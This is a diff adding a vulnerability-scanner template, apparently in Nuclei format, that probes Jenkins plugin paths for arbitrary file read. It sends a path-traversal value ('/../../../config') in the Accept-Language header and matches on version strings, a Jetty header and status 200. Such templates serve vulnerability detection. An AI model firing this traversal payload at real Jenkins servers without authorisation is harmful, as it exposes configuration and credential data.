@@ -1,0 +1,31 @@
+id: poc-yaml-jenkins-arbitrary-file-read
+
+info:
+  name: "Jenkins Plugin 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: jenkins
+
+http:
+  - method: GET
+    path:
+      - "/plugin/credentials/.xml"
+      - "/plugin/git/.xml"
+      - "/plugin/ldap/.xml"
+    headers:
+      Accept-Language: /../../../config
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<version>"
+          - "</version>"
+          - "jenkins"
+      - type: word
+        part: header
+        words:
+          - "Jetty"
+      - type: status
+        status:
+          - 200
